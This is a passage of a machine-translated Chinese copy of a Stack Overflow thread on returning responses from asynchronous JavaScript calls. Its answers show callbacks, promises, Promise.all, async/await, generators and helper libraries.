    this.searchService.search(this.searchField.value)
      .then((result) => {
    this.result = result.artists.items;
  })
  .catch((error) => console.error(error));
} 
```

请参阅此处的[原始](https://angular-2-training-book.rangle.io/handout/http/requests_as_promises.html)帖子。但是 TypeScript 不支持[原生 ES6 Promises](http://www.datchley.name/es6-promises/)，如果你想使用它，你可能需要插件。

此外，这里是[promise 规范](https://github.com/promises-aplus/promises-spec)。

* * *

## 回答 #9

> 赞同：176
> 
> 时间：2017-05-03T16:59:06.400

这里的大多数答案都为您何时进行单个异步操作提供了有用的建议，但有时，当您需要对数组或其他类似列表的结构中的*每个条目执行异步操作时，就会出现这种情况。*这样做的诱惑是：

```
// WRONG
var results = [];
theArray.forEach(function(entry) {
    doSomethingAsync(entry, function(result) {
        results.push(result);
    });
});
console.log(results); // E.g., using them, returning them, etc. 
```

例子：

```
// WRONG
var theArray = [1, 2, 3];
var results = [];
theArray.forEach(function(entry) {
    doSomethingAsync(entry, function(result) {
        results.push(result);
    });
});
console.log("Results:", results); // E.g., using them, returning them, etc.

function doSomethingAsync(value, callback) {
    console.log("Starting async operation for " + value);
    setTimeout(function() {
        console.log("Completing async operation for " + value);
        callback(value * 2);
    }, Math.floor(Math.random() * 200));
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

不起作用的原因是，`doSomethingAsync`当您尝试使用结果时，来自的回调尚未运行。

因此，如果您有一个数组（或某种列表）并且想要对每个条目执行异步操作，您有两个选择：并行（重叠）或串行（一个接一个地依次执行）操作。

### 平行

您可以启动所有这些并跟踪您期望的回调数量，然后在获得那么多回调时使用结果：

```
var results = [];
var expecting = theArray.length;
theArray.forEach(function(entry, index) {
    doSomethingAsync(entry, function(result) {
        results[index] = result;
        if (--expecting === 0) {
            // Done!
            console.log("Results:", results); // E.g., using the results
        }
    });
}); 
```

例子：

```
var theArray = [1, 2, 3];
var results = [];
var expecting = theArray.length;
theArray.forEach(function(entry, index) {
    doSomethingAsync(entry, function(result) {
        results[index] = result;
        if (--expecting === 0) {
            // Done!
            console.log("Results:", JSON.stringify(results)); // E.g., using the results
        }
    });
});

function doSomethingAsync(value, callback) {
    console.log("Starting async operation for " + value);
    setTimeout(function() {
        console.log("Completing async operation for " + value);
        callback(value * 2);
    }, Math.floor(Math.random() * 200));
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

*（我们可以取消`expecting`并只使用`results.length === theArray.length`，但这让我们有可能`theArray`在通话未完成时更改...）*

请注意我们如何使用`index`from`forEach`将结果保存在`results`与其相关的条目相同的位置，即使结果无序到达（因为异步调用不一定按照它们开始的顺序完成）。

但是，如果您需要从函数中*返回这些结果怎么办？*正如其他答案所指出的那样，您不能；您必须让您的函数接受并调用回调（或返回[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)）。这是一个回调版本：

```
function doSomethingWith(theArray, callback) {
    var results = [];
    var expecting = theArray.length;
    theArray.forEach(function(entry, index) {
        doSomethingAsync(entry, function(result) {
            results[index] = result;
            if (--expecting === 0) {
                // Done!
                callback(results);
            }
        });
    });
}
doSomethingWith(theArray, function(results) {
    console.log("Results:", results);
}); 
```

例子：

```
function doSomethingWith(theArray, callback) {
    var results = [];
    var expecting = theArray.length;
    theArray.forEach(function(entry, index) {
        doSomethingAsync(entry, function(result) {
            results[index] = result;
            if (--expecting === 0) {
                // Done!
                callback(results);
            }
        });
    });
}
doSomethingWith([1, 2, 3], function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value, callback) {
    console.log("Starting async operation for " + value);
    setTimeout(function() {
        console.log("Completing async operation for " + value);
        callback(value * 2);
    }, Math.floor(Math.random() * 200));
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

或者这是一个返回 a 的版本`Promise`：

```
function doSomethingWith(theArray) {
    return new Promise(function(resolve) {
        var results = [];
        var expecting = theArray.length;
        theArray.forEach(function(entry, index) {
            doSomethingAsync(entry, function(result) {
                results[index] = result;
                if (--expecting === 0) {
                    // Done!
                    resolve(results);
                }
            });
        });
    });
}
doSomethingWith(theArray).then(function(results) {
    console.log("Results:", results);
}); 
```

*当然，如果`doSomethingAsync`传递给我们错误，我们会`reject`在遇到错误时拒绝承诺。）*

例子：

```
function doSomethingWith(theArray) {
    return new Promise(function(resolve) {
        var results = [];
        var expecting = theArray.length;
        theArray.forEach(function(entry, index) {
            doSomethingAsync(entry, function(result) {
                results[index] = result;
                if (--expecting === 0) {
                    // Done!
                    resolve(results);
                }
            });
        });
    });
}
doSomethingWith([1, 2, 3]).then(function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value, callback) {
    console.log("Starting async operation for " + value);
    setTimeout(function() {
        console.log("Completing async operation for " + value);
        callback(value * 2);
    }, Math.floor(Math.random() * 200));
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

*（或者，您可以为`doSomethingAsync`返回一个承诺制作一个包装器，然后执行以下操作......）*

如果`doSomethingAsync`给你一个[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)，你可以使用[`Promise.all`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all)：

```
function doSomethingWith(theArray) {
    return Promise.all(theArray.map(function(entry) {
        return doSomethingAsync(entry);
    }));
}
doSomethingWith(theArray).then(function(results) {
    console.log("Results:", results);
}); 
```

如果你知道它`doSomethingAsync`会忽略第二个和第三个参数，你可以直接将它传递给`map`（`map`用三个参数调用它的回调，但大多数人大部分时间只使用第一个）：

```
function doSomethingWith(theArray) {
    return Promise.all(theArray.map(doSomethingAsync));
}
doSomethingWith(theArray).then(function(results) {
    console.log("Results:", results);
}); 
```

例子：

```
function doSomethingWith(theArray) {
    return Promise.all(theArray.map(doSomethingAsync));
}
doSomethingWith([1, 2, 3]).then(function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value) {
    console.log("Starting async operation for " + value);
    return new Promise(function(resolve) {
        setTimeout(function() {
            console.log("Completing async operation for " + value);
            resolve(value * 2);
        }, Math.floor(Math.random() * 200));
    });
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

请注意，`Promise.all`当它们全部解决时，它会使用您给它的所有承诺的结果数组来解决它的承诺，或者当您给它的*第一个*承诺拒绝时拒绝它的承诺。

### 系列

假设您不希望这些操作是并行的？如果你想一个接一个地运行它们，你需要等待每个操作完成后再开始下一个操作。这是执行此操作并使用结果调用回调的函数示例：

```
function doSomethingWith(theArray, callback) {
    var results = [];
    doOne(0);
    function doOne(index) {
        if (index < theArray.length) {
            doSomethingAsync(theArray[index], function(result) {
                results.push(result);
                doOne(index + 1);
            });
        } else {
            // Done!
            callback(results);
        }
    }
}
doSomethingWith(theArray, function(results) {
    console.log("Results:", results);
}); 
```

*（因为我们是按顺序进行工作，所以我们可以使用，`results.push(result)`因为我们知道我们不会得到乱序的结果。在上面我们可以使用`results[index] = result;`，但在下面的一些示例中，我们没有索引使用。）*

例子：

```
function doSomethingWith(theArray, callback) {
    var results = [];
    doOne(0);
    function doOne(index) {
        if (index < theArray.length) {
            doSomethingAsync(theArray[index], function(result) {
                results.push(result);
                doOne(index + 1);
            });
        } else {
            // Done!
            callback(results);
        }
    }
}
doSomethingWith([1, 2, 3], function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value, callback) {
    console.log("Starting async operation for " + value);
    setTimeout(function() {
        console.log("Completing async operation for " + value);
        callback(value * 2);
    }, Math.floor(Math.random() * 200));
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

*（或者，再次构建一个包装器`doSomethingAsync`，为您提供一个承诺并执行以下操作......）*

如果`doSomethingAsync`给你一个 Promise，如果你可以使用 ES2017+ 语法（可能使用像[Babel](http://babeljs.io)这样的编译器） ，你可以使用一个[`async`函数](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)和：[`for-of`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)[`await`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)

```
async function doSomethingWith(theArray) {
    const results = [];
    for (const entry of theArray) {
        results.push(await doSomethingAsync(entry));
    }
    return results;
}
doSomethingWith(theArray).then(results => {
    console.log("Results:", results);
}); 
```

例子：

```
async function doSomethingWith(theArray) {
    const results = [];
    for (const entry of theArray) {
        results.push(await doSomethingAsync(entry));
    }
    return results;
}
doSomethingWith([1, 2, 3]).then(function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value) {
    console.log("Starting async operation for " + value);
    return new Promise(function(resolve) {
        setTimeout(function() {
            console.log("Completing async operation for " + value);
            resolve(value * 2);
        }, Math.floor(Math.random() * 200));
    });
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

如果您还不能使用 ES2017+ 语法，您可以使用[“Promise reduce”模式](https://stackoverflow.com/questions/43433643/javascript-how-do-i-reduce-multiple-promise-all)的变体（这比通常的 Promise reduce 更复杂，因为我们不会将结果从一个传递到下一个，而是将他们的结果收集到一个数组中）：

```
function doSomethingWith(theArray) {
    return theArray.reduce(function(p, entry) {
        return p.then(function(results) {
            return doSomethingAsync(entry).then(function(result) {
                results.push(result);
                return results;
            });
        });
    }, Promise.resolve([]));
}
doSomethingWith(theArray).then(function(results) {
    console.log("Results:", results);
}); 
```

例子：

```
function doSomethingWith(theArray) {
    return theArray.reduce(function(p, entry) {
        return p.then(function(results) {
            return doSomethingAsync(entry).then(function(result) {
                results.push(result);
                return results;
            });
        });
    }, Promise.resolve([]));
}
doSomethingWith([1, 2, 3]).then(function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value) {
    console.log("Starting async operation for " + value);
    return new Promise(function(resolve) {
        setTimeout(function() {
            console.log("Completing async operation for " + value);
            resolve(value * 2);
        }, Math.floor(Math.random() * 200));
    });
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

[...使用ES2015+ 箭头函数](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)不太麻烦：

```
function doSomethingWith(theArray) {
    return theArray.reduce((p, entry) => p.then(results => doSomethingAsync(entry).then(result => {
        results.push(result);
        return results;
    })), Promise.resolve([]));
}
doSomethingWith(theArray).then(results => {
    console.log("Results:", results);
}); 
```

例子：

```
function doSomethingWith(theArray) {
    return theArray.reduce((p, entry) => p.then(results => doSomethingAsync(entry).then(result => {
        results.push(result);
        return results;
    })), Promise.resolve([]));
}
doSomethingWith([1, 2, 3]).then(function(results) {
    console.log("Results:", JSON.stringify(results));
});

function doSomethingAsync(value) {
    console.log("Starting async operation for " + value);
    return new Promise(function(resolve) {
        setTimeout(function() {
            console.log("Completing async operation for " + value);
            resolve(value * 2);
        }, Math.floor(Math.random() * 200));
    });
}
```

```
.as-console-wrapper { max-height: 100% !important; }
```

* * *

## 回答 #10

> 赞同：122
> 
> 时间：2016-06-02T08:31:13.677

**看看这个例子：**

```
var app = angular.module('plunker', []);

app.controller('MainCtrl', function($scope,$http) {

    var getJoke = function(){
        return $http.get('http://api.icndb.com/jokes/random').then(function(res){
            return res.data.value;  
        });
    }

    getJoke().then(function(res) {
        console.log(res.joke);
    });
}); 
```

如您所见`getJoke`，它**返回了一个已**解决的**承诺**（返回时已解决`res.data.value`）。所以你等到**$http.get**请求完成，然后执行**console.log(res.joke)**（作为正常的异步流程）。

**这是 plnkr：**

[http://embed.plnkr.co/XlNR7HpCaIhJxskMJfSg/](http://embed.plnkr.co/XlNR7HpCaIhJxskMJfSg/)

**ES6 方式（异步 - 等待）**

```
(function(){
  async function getJoke(){
    let response = await fetch('http://api.icndb.com/jokes/random');
    let data = await response.json();
    return data.value;
  }

  getJoke().then((joke) => {
    console.log(joke);
  });
})(); 
```

* * *

## 回答 #11

> 赞同：121
> 
> 时间：2017-05-24T09:38:10.597

这是在许多新的 JavaScript 框架中使用**的双向数据绑定**或**存储概念对您非常有用的地方之一......**

因此，如果您正在使用[Angular](https://en.wikipedia.org/wiki/Angular_(web_framework))、[React](https://en.wikipedia.org/wiki/React_(web_framework))或任何其他执行双向数据绑定或存储概念的框架，则此问题已为您解决了，所以简单地说，您的结果`undefined`处于第一阶段，所以您已经得到`result = undefined`了您收到数据，然后一旦获得结果，它将被更新并分配给您的 Ajax 调用响应的新值...

但是，例如，正如您在这个问题中所问的那样，您如何在纯 JavaScript 或 jQuery 中做到这一点？

你可以使用回调、promise 和最近 observable 来为你处理它。例如，在 Promise 中，我们有一些类似`success()`or`then()`的函数，当你的数据准备好时会执行。与可观察对象上的回调或*订阅函数相同。*

例如，在您使用 jQuery 的情况下，您可以执行以下操作：

```
$(document).ready(function(){
    function foo() {
        $.ajax({url: "api/data", success: function(data){
            fooDone(data); // After we have data, we pass it to fooDone
        }});
    };

    function fooDone(data) {
        console.log(data); // fooDone has the data and console.log it
    };

    foo(); // The call happens here
}); 
```

有关更多信息，请研究 promises 和 observables，它们是执行此异步操作的新方法。

* * *

## 回答 #12

> 赞同：118
> 
> 时间：2017-10-31T20:12:45.767

这是我们在与 JavaScript 的“奥秘”作斗争时面临的一个非常普遍的问题。今天让我试着揭开这个谜团。

让我们从一个简单的 JavaScript 函数开始：

```
function foo(){
    // Do something
    return 'wohoo';
}

let bar = foo(); // 'bar' is 'wohoo' here 
```

这是一个简单的同步函数调用（其中每一行代码在下一行之前“完成其工作”），结果与预期相同。

现在让我们添加一点扭曲，通过在我们的函数中引入一点延迟，这样所有代码行都不会按顺序“完成”。因此，它将模拟函数的异步行为：

```
function foo(){
    setTimeout( ()=> {
        return 'wohoo';
   }, 1000)
}

let bar = foo() // 'bar' is undefined here 
```

所以你去; 这种延迟刚刚破坏了我们预期的功能！但究竟发生了什么？好吧，如果您查看代码，这实际上是非常合乎逻辑的。

该函数`foo()`在执行时不返回任何内容（因此返回值为`undefined`），但它确实启动了一个计时器，该计时器在 1 秒后执行一个函数以返回 'woohoo'。但是正如你所看到的，分配给 bar 的值是从 foo() 立即返回的东西，它什么都不是，即只是`undefined`.

**那么，我们该如何解决这个问题呢？**

让我们向我们的函数请求一个*promise*。Promise 的真正含义是：它意味着该函数保证您提供将来获得的任何输出。所以让我们看看它在上面的小问题中的作用：

```
function foo(){
   return new Promise((resolve, reject) => { // I want foo() to PROMISE me something
    setTimeout ( function(){
      // Promise is RESOLVED, when the execution reaches this line of code
       resolve('wohoo') // After 1 second, RESOLVE the promise with value 'wohoo'
    }, 1000 )
  })
}

let bar;
foo().then( res => {
    bar = res;
    console.log(bar) // Will print 'wohoo'
}); 
```

因此，总结是 - 要处理基于 Ajax 的调用等异步函数，您可以使用`resolve`对值的承诺（您打算返回）。因此，简而言之，您在异步函数中**解析**值而不是**返回。**

## 更新（异步/等待的承诺）

除了使用`then/catch`promise 之外，还有另一种方法。这个想法是*识别一个异步函数*，然后*等待 Promise*解决，然后再转到下一行代码。它仍然只是`promises`底层，但使用了不同的语法方法。为了让事情更清楚，您可以在下面找到一个比较：

### 然后/赶上版本：

```
function saveUsers(){
     getUsers()
      .then(users => {
         saveSomewhere(users);
      })
      .catch(err => {
          console.error(err);
       })
 } 
```

### 异步/等待版本：

```
 async function saveUsers(){
     try{
        let users = await getUsers()
        saveSomewhere(users);
     }
     catch(err){
        console.error(err);
     }
  } 
```

* * *

## 回答 #13

> 赞同：109
> 
> 时间：2015-09-02T12:54:37.763

从异步函数返回值的另一种方法是传入一个对象，该对象将存储异步函数的结果。

这是一个相同的例子：

```
var async = require("async");

// This wires up result back to the caller
var result = {};
var asyncTasks = [];
asyncTasks.push(function(_callback){
    // some asynchronous operation
    $.ajax({
        url: '...',
        success: function(response) {
            result.response = response;
            _callback();
        }
    });
});

async.parallel(asyncTasks, function(){
    // result is available after performing asynchronous operation
    console.log(result)
    console.log('Done');
}); 
```

我`result`在异步操作期间使用对象来存储值。即使在异步作业之后，这也允许结果可用。

我经常使用这种方法。我很想知道这种方法在涉及通过连续模块将结果连接回的情况下效果如何。

* * *

## 回答 #14

> 赞同：96
> 
> 时间：2016-01-25T17:43:56.100

虽然 Promise 和回调在许多情况下都可以正常工作，但在后面表达类似这样的内容是很痛苦的：

```
if (!name) {
  name = async1();
}
async2(name); 
```

你最终会经历`async1`; 检查是否`name`未定义并相应地调用回调。

```
async1(name, callback) {
  if (name)
    callback(name)
  else {
    doSomething(callback)
  }
}

async1(name, async2) 
```

虽然在小例子中*没问题*，但当你有很多类似的情况和涉及错误处理时，它会变得很烦人。

`Fibers`有助于解决问题。

```
var Fiber = require('fibers')

function async1(container) {
  var current = Fiber.current
  var result
  doSomething(function(name) {
    result = name
    fiber.run()
  })
  Fiber.yield()
  return result
}

Fiber(function() {
  var name
  if (!name) {
    name = async1()
  }
  async2(name)
  // Make any number of async calls from here
} 
```

[您可以在此处](https://github.com/laverdet/node-fibers)签出该项目。

* * *

## 回答 #15

> 赞同：93
> 
> 时间：2016-04-12T22:55:39.063

我编写的以下示例显示了如何

*   处理异步 HTTP 调用；
*   等待每个 API 调用的响应；
*   使用[承诺](https://en.wikipedia.org/wiki/Futures_and_promises)模式；
*   使用[Promise.all](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all)模式加入多个 HTTP 调用；

这个工作示例是独立的。它将定义一个使用窗口`XMLHttpRequest`对象进行调用的简单请求对象。它将定义一个简单的函数来等待一堆承诺完成。

语境。该示例查询[Spotify Web API](https://developer.spotify.com/web-api/endpoint-reference/)端点以搜索`playlist`给定查询字符串集的对象：

```
[
 "search?type=playlist&q=%22doom%20metal%22",
 "search?type=playlist&q=Adele"
] 
```

对于每个项目，一个新的 Promise 将触发一个块 - `ExecutionBlock`，解析结果，根据结果数组（即 Spotify 对象列表）安排一组新的 Promise，并在异步中`user`执行新的 HTTP 调用。`ExecutionProfileBlock`

然后，您可以看到一个嵌套的 Promise 结构，它允许您生成多个完全异步的嵌套 HTTP 调用，并通过`Promise.all`.

**注意** 最近的 Spotify `search`API 将需要在请求标头中指定访问令牌：

```
-H "Authorization: Bearer {your access token}" 
```

因此，要运行以下示例，您需要将访问令牌放入请求标头中：

```
var spotifyAccessToken = "YourSpotifyAccessToken";
var console = {
    log: function(s) {
        document.getElementById("console").innerHTML += s + "<br/>"
    }
}

// Simple XMLHttpRequest
// based on https://davidwalsh.name/xmlhttprequest
SimpleRequest = {
    call: function(what, response) {
        var request;
        if (window.XMLHttpRequest) { // Mozilla, Safari, ...
            request = new XMLHttpRequest();
        } else if (window.ActiveXObject) { // Internet Explorer
            try {
                request = new ActiveXObject('Msxml2.XMLHTTP');
            }
            catch (e) {
                try {
                  request = new ActiveXObject('Microsoft.XMLHTTP');
                } catch (e) {}
            }
        }

        // State changes
        request.onreadystatechange = function() {
            if (request.readyState === 4) { // Done
                if (request.status === 200) { // Complete
                    response(request.responseText)
                }
                else
                    response();
            }
        }
        request.open('GET', what, true);
        request.setRequestHeader("Authorization", "Bearer " + spotifyAccessToken);
        request.send(null);
    }
}

//PromiseAll
var promiseAll = function(items, block, done, fail) {
    var self = this;
    var promises = [],
                   index = 0;
    items.forEach(function(item) {
        promises.push(function(item, i) {
            return new Promise(function(resolve, reject) {
                if (block) {
                    block.apply(this, [item, index, resolve, reject]);
                }
            });
        }(item, ++index))
    });
    Promise.all(promises).then(function AcceptHandler(results) {
        if (done) done(results);
    }, function ErrorHandler(error) {
        if (fail) fail(error);
    });
}; //promiseAll

// LP: deferred execution block
var ExecutionBlock = function(item, index, resolve, reject) {
    var url = "https://api.spotify.com/v1/"
    url += item;
    console.log( url )
    SimpleRequest.call(url, function(result) {
        if (result) {

            var profileUrls = JSON.parse(result).playlists.items.map(function(item, index) {
                return item.owner.href;
            })
            resolve(profileUrls);
        }
        else {
            reject(new Error("call error"));
        }
    })
}

arr = [
    "search?type=playlist&q=%22doom%20metal%22",
    "search?type=playlist&q=Adele"
]

promiseAll(arr, function(item, index, resolve, reject) {
    console.log("Making request [" + index + "]")
    ExecutionBlock(item, index, resolve, reject);
}, function(results) { // Aggregated results

    console.log("All profiles received " + results.length);
    //console.log(JSON.stringify(results[0], null, 2));

    ///// promiseall again

    var ExecutionProfileBlock = function(item, index, resolve, reject) {
        SimpleRequest.call(item, function(result) {
            if (result) {
                var obj = JSON.parse(result);
                resolve({
                    name: obj.display_name,
                    followers: obj.followers.total,
                    url: obj.href
                });
            } //result
        })
    } //ExecutionProfileBlock

    promiseAll(results[0], function(item, index, resolve, reject) {
        //console.log("Making request [" + index + "] " + item)
        ExecutionProfileBlock(item, index, resolve, reject);
    }, function(results) { // aggregated results
        console.log("All response received " + results.length);
        console.log(JSON.stringify(results, null, 2));
    }

    , function(error) { // Error
        console.log(error);
    })

    /////

  },
  function(error) { // Error
      console.log(error);
  });
```

```
<div id="console" />
```

我在[这里](https://stackoverflow.com/questions/36536245/how-to-search-for-a-user-by-name-using-spotify-web-api/36537774#36537774)广泛讨论了这个解决方案。

* * *

## 回答 #16

> 赞同：92
> 
> 时间：2016-04-22T14:47:08.960

简短的回答是，**您必须实现这样的回调：**

```
function callback(response) {
    // Here you can do what ever you want with the response object.
    console.log(response);
}

$.ajax({
    url: "...",
    success: callback
}); 
```

* * *

## 回答 #17

> 赞同：87
> 
> 时间：2018-02-03T06:06:53.637

> JavaScript 是单线程的。

浏览器可以分为三个部分：

1.  事件循环

2.  网络 API

3.  事件队列

事件循环永远运行，即一种无限循环。事件队列是所有函数都被推送到某个事件（例如：点击）的地方。

这是从队列中逐一执行并放入事件循环中，该循环执行此函数并在执行第一个函数后为下一个函数做好准备。这意味着一个函数的执行直到队列中它之前的函数在事件循环中执行后才开始。

现在让我们认为我们将两个函数推送到一个队列中。一种是从服务器获取数据，另一种是利用该数据。我们先将 serverRequest() 函数推送到队列中，然后再推送 utiliseData() 函数。serverRequest 函数进入事件循环并调用服务器，因为我们永远不知道从服务器获取数据需要多少时间，所以这个过程预计需要时间，所以我们忙于我们的事件循环从而挂起我们的页面。

这就是 Web API 发挥作用的地方。它从事件循环中获取这个函数并处理服务器使事件循环空闲，以便我们可以执行队列中的下一个函数。

队列中的下一个函数是 utiliseData() ，它进入循环，但是由于没有可用的数据，它会被浪费，并且下一个函数的执行会一直持续到队列的末尾。（这称为异步调用，即，我们可以做其他事情，直到我们得到数据。）

让我们假设我们的 serverRequest() 函数在代码中有一个 return 语句。当我们从服务器 Web API 取回数据时，它会将数据推送到队列末尾的队列中。

当它在队列末尾被推送时，我们无法利用它的数据，因为我们的队列中没有任何函数可以利用这些数据。**因此不可能从异步调用中返回一些东西。**

因此，*解决方案*是*callback*或*promise*。

*   来自[此处答案之一的](https://stackoverflow.com/questions/14220321/how-do-i-return-the-response-from-an-asynchronous-call/38898933#38898933)图像*正确*解释了回调的使用... *

我们将我们的函数（利用从服务器返回的数据的函数）提供给调用服务器的函数。

[![打回来](../Images/a26fc6063188ccbe33115a52373422fe.png)](https://i.stack.imgur.com/UCJgN.png)

```
function doAjax(callbackFunc, method, url) {
    var xmlHttpReq = new XMLHttpRequest();
    xmlHttpReq.open(method, url);
    xmlHttpReq.onreadystatechange = function() {

        if (xmlHttpReq.readyState == 4 && xmlHttpReq.status == 200) {
            callbackFunc(xmlHttpReq.responseText);
        }
    }
    xmlHttpReq.send(null);
} 
```

在我的*代码*中，它被称为：

```
function loadMyJson(categoryValue){
    if(categoryValue === "veg")
        doAjax(print, "GET", "http://localhost:3004/vegetables");
    else if(categoryValue === "fruits")
        doAjax(print, "GET", "http://localhost:3004/fruits");
    else
      console.log("Data not found");
} 
```

[JavaScript.info 回调](https://javascript.info/callbacks)

* * *

## 回答 #18

> 赞同：85
> 
> 时间：2017-06-02T09:51:10.950

# [2017 年回答：您现在可以在每个当前浏览器和Node.js](https://en.wikipedia.org/wiki/Node.js)中执行您想要的操作

这很简单：

*   返回一个承诺
*   使用['await'](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)，它会告诉 JavaScript 等待 promise 被解析为一个值（如 HTTP 响应）
*   将[“异步”](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)关键字添加到父函数

这是您的代码的工作版本：

```
(async function(){

    var response = await superagent.get('...')
    console.log(response)

})() 
```

[所有当前浏览器和 Node.js 8 都支持 await](http://caniuse.com/#search=await)

* * *

## 回答 #19

> 赞同：71
> 
> 时间：2016-05-26T13:26:40.817

您可以使用这个自定义库（使用 Promise 编写）进行远程调用。

```
function $http(apiConfig) {
    return new Promise(function (resolve, reject) {
        var client = new XMLHttpRequest();
        client.open(apiConfig.method, apiConfig.url);
        client.send();
        client.onload = function () {
            if (this.status >= 200 && this.status < 300) {
                // Performs the function "resolve" when this.status is equal to 2xx.
                // Your logic here.
                resolve(this.response);
            }
            else {
                // Performs the function "reject" when this.status is different than 2xx.
                reject(this.statusText);
            }
        };
        client.onerror = function () {
            reject(this.statusText);
        };
    });
} 
```

简单的使用示例：

```
$http({
    method: 'get',
    url: 'google.com'
}).then(function(response) {
    console.log(response);
}, function(error) {
    console.log(error)
}); 
```

* * *

## 回答 #20

> 赞同：71
> 
> 时间：2017-05-27T02:47:04.280

另一种解决方案是通过顺序执行[器 nsynjs](https://github.com/amaksr/nsynjs)执行代码。

## 如果底层功能被承诺

nsynjs 将依次评估所有的 Promise，并将 Promise 结果放入`data`属性中：

```
function synchronousCode() {

    var getURL = function(url) {
        return window.fetch(url).data.text().data;
    };

    var url = 'https://ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js';
    console.log('received bytes:',getURL(url).length);

};

nsynjs.run(synchronousCode,{},function(){
    console.log('synchronousCode done');
});
```

```
<script src="https://rawgit.com/amaksr/nsynjs/master/nsynjs.js"></script>
```

## 如果底层函数没有被承诺

步骤 1\. 将带有回调的函数包装到 nsynjs-aware 包装器中（如果它有 promisified 版本，则可以跳过此步骤）：

```
var ajaxGet = function (ctx,url) {
    var res = {};
    var ex;
    $.ajax(url)
    .done(function (data) {
        res.data = data;
    })
    .fail(function(e) {
        ex = e;
    })
    .always(function() {
        ctx.resume(ex);
    });
    return res;
};
ajaxGet.nsynjsHasCallback = true; 
```

步骤 2\. 将同步逻辑放入函数中：

```
function process() {
    console.log('got data:', ajaxGet(nsynjsCtx, "data/file1.json").data);
} 
```

Step 3\. 通过nsynjs同步运行函数：

```
nsynjs.run(process,this,function () {
    console.log("synchronous function finished");
}); 
```

Nsynjs 将逐步评估所有运算符和表达式，如果某些慢速函数的结果未准备好，则暂停执行。

更多示例在[这里](https://github.com/amaksr/nsynjs/tree/master/examples)。

* * *

## 回答 #21

> 赞同：44
> 
> 时间：2018-02-17T15:26:28.153

ECMAScript 6 具有“生成器”，可让您轻松地以异步方式进行编程。

```
function* myGenerator() {
    const callback = yield;
    let [response] = yield $.ajax("https://stackoverflow.com", {complete: callback});
    console.log("response is:", response);

    // examples of other things you can do
    yield setTimeout(callback, 1000);
    console.log("it delayed for 1000ms");
    while (response.statusText === "error") {
        [response] = yield* anotherGenerator();
    }
} 
```

要运行上述代码，请执行以下操作：

```
const gen = myGenerator(); // Create generator
gen.next(); // Start it
gen.next((...args) => gen.next([...args])); // Set its callback function 
```

如果您需要针对不支持 ES6 的浏览器，您可以通过 Babel 或闭包编译器运行代码以生成 ECMAScript 5。

回调`...args`被包装在一个数组中，并在您读取它们时进行解构，以便该模式可以处理具有多个参数的回调。例如[节点 fs](https://nodejs.org/api/fs.html)：

```
const [err, data] = yield fs.readFile(filePath, "utf-8", callback); 
```

* * *

## 回答 #22

> 赞同：41
> 
> 时间：2016-01-23T03:28:39.267

我们发现自己处于一个似乎沿着我们称为“时间”的维度前进的宇宙中。我们并不真正了解时间是什么，但我们已经开发了抽象和词汇来让我们推理和谈论它：“过去”、“现在”、“未来”、“之前”、“之后”。

我们构建的计算机系统——越来越多——将时间作为一个重要维度。某些事情注定要在未来发生。然后其他事情需要在这些第一件事最终发生之后发生。这就是所谓的“异步”的基本概念。在我们日益网络化的世界中，最常见的异步情况是等待某个远程系统响应某个请求。

考虑一个例子。你打电话给送奶工，要一些牛奶。当它出现时，你想把它放在你的咖啡里。你现在不能把牛奶放进你的咖啡里，因为它还没有出现。您必须等待它来，然后才能将其放入咖啡中。换句话说，以下内容不起作用：

```
var milk = order_milk();
put_in_coffee(milk); 
```

因为 JavaScript 无法知道在执行之前需要**等待**`order_milk`完成`put_in_coffee`。换句话说，它不知道这`order_milk`是**异步**的——直到未来某个时间才会产生牛奶。JavaScript 和其他声明性语言在不等待的情况下一个接一个地执行语句。

解决这个问题的经典 JavaScript 方法，利用 JavaScript 支持函数作为可以传递的第一类对象这一事实，将函数作为参数传递给异步请求，然后在完成时调用它它的任务在未来的某个时候。这就是“回调”方法。它看起来像这样：

```
order_milk(put_in_coffee); 
```

`order_milk`开始，订购牛奶，然后，当且仅当它到达时，它才会调用`put_in_coffee`.

这种回调方法的问题是它污染了函数的正常语义，用`return`;报告其结果。相反，函数不得通过调用作为参数给出的回调来报告其结果。此外，在处理较长的事件序列时，这种方法可能会迅速变得笨拙。例如，假设我想等待牛奶放入咖啡中，然后才执行第三步，即喝咖啡。我最终需要写这样的东西：

```
order_milk(function(milk) { put_in_coffee(milk, drink_coffee); } 
```

我将`put_in_coffee`要放入牛奶的地方，以及放入牛奶后`drink_coffee`要执行的动作（）。这样的代码变得难以编写、阅读和调试。

在这种情况下，我们可以将问题中的代码重写为：

```
var answer;
$.ajax('/foo.json') . done(function(response) {
  callback(response.data);
});

function callback(data) {
  console.log(data);
} 
```

### 输入承诺

这就是“承诺”概念的动机，“承诺”是一种特殊类型的值，代表某种**未来**或**异步**结果。它可以代表已经发生的事情，或者将来会发生的事情，或者可能永远不会发生。Promise 有一个名为 的方法，`then`当 Promise 所代表的结果已经实现时，您将向该方法传递要执行的操作。

